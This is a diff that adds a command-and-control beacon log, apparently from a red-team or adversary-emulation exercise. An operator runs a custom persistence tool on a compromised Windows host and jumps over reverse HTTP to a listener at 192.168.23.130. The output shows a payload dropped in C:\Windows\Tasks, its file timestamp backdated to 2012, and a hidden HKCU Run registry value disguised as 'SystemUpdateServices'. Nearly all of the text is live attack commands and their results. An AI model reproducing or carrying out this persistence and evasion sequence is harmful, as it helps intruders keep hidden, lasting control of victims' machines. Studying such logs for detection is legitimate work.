@@ -1,0 +1,69 @@
+08/17 19:39:38 UTC [metadata] 192.168.23.131 <- 192.168.23.131; computer: COMPUTER02; user: jdoe; process: update.exe; pid: 5288; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+08/17 19:40:01 UTC [input] <analyst01> 1 20
+08/17 19:40:01 UTC [error] Unknown command: 1 20
+08/17 19:40:05 UTC [input] <analyst01> sleep 1 20
+08/17 19:40:05 UTC [task] <T1029> Tasked beacon to sleep for 1s (20% jitter)
+08/17 19:40:34 UTC [checkin] host called home, sent: 16 bytes
+08/17 19:41:11 UTC [input] <analyst01> execute-assembly /home/analyst01/payloads/Persistance.exe
+08/17 19:41:12 UTC [task] <T1093> Tasked beacon to run program: Persistance.exe
+08/17 19:41:12 UTC [checkin] host called home, sent: 125483 bytes
+08/17 19:41:12 UTC [output]
+received output:
+
+	Example: Persistance.exe -a -k keyvalue -p C:\windows\temp\update.exe
+
+
+	Persistance.exe -k <keyvalue> [-a | -d | -c]
+		-a: adds persistance
+		-d: deletes persistance
+
+		-c: checks for persistance
+
+
+	Arguments:
+	-p: path to store and execute persistance from
+
+	-k: registry key name
+		default = SystemUpdateServices
+
+
+
+
+
+08/17 19:41:24 UTC [input] <analyst01> execute-assembly /home/analyst01/payloads/Persistance.exe -c
+08/17 19:41:24 UTC [task] <T1093> Tasked beacon to run program: Persistance.exe -c
+08/17 19:41:24 UTC [checkin] host called home, sent: 125507 bytes
+08/17 19:41:24 UTC [output]
+received output:
+
+Registry HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Values:
+OneDrive
+
+Persistance not found
+
+
+08/17 19:42:04 UTC [input] <analyst01> jump user_persist COMPUTER02 http
+08/17 19:42:05 UTC [task] <T1547.001> Tasked Beacon to jump to COMPUTER02 (windows/beacon_http/reverse_http (192.168.23.130:80)) via registry persistance
+08/17 19:42:06 UTC [task] <T1093> Tasked beacon to run program: persist.exe -a
+08/17 19:42:06 UTC [checkin] host called home, sent: 411201 bytes
+08/17 19:42:06 UTC [output]
+received output:
+Writing C:\Windows\Tasks\systemupdate.exe
+Setting file timestamp to 4/26/2012 3:35:14 AM
+Adding registry value name: SystemUpdateServices
+Adding registry value data: C:\Windows\Tasks\systemupdate.exe
+
+
+08/17 19:42:34 UTC [input] <analyst01> execute-assembly /home/analyst01/payloads/Persistance.exe -c
+08/17 19:42:34 UTC [task] <T1093> Tasked beacon to run program: Persistance.exe -c
+08/17 19:42:35 UTC [checkin] host called home, sent: 125507 bytes
+08/17 19:42:35 UTC [output]
+received output:
+
+Registry HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Values:
+OneDrive
+<Hidden registry value>
+
+Persistance found
+
+
